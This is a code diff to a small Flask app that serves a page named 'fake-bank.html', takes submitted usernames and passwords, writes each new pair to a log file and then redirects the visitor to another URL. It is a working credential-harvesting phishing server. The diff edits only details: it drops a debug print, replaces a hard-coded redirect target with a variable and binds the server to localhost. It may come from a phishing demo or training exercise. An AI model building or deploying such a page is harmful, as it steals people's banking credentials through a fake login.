@@ -11,7 +11,6 @@ post_log = "log-Q4.txt"
 @app.route("/", methods=["GET", "POST"])
 def home():
     if request.method == "POST":
-        print("post method called")
         username = request.form.get("username")
         password = request.form.get("password")
 
@@ -19,7 +18,7 @@ def home():
             if f"{username},{password}" not in file.read():
                 file.write(f"{username},{password}\n")
         
-        return redirect(f'http://localhost:80', 308)
+        return redirect(URL, 308)
         
     
     return render_template('fake-bank.html')
@@ -32,4 +31,4 @@ def log():
     
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=4050)
+    app.run(debug=True, host='127.0.0.1', port=4050)
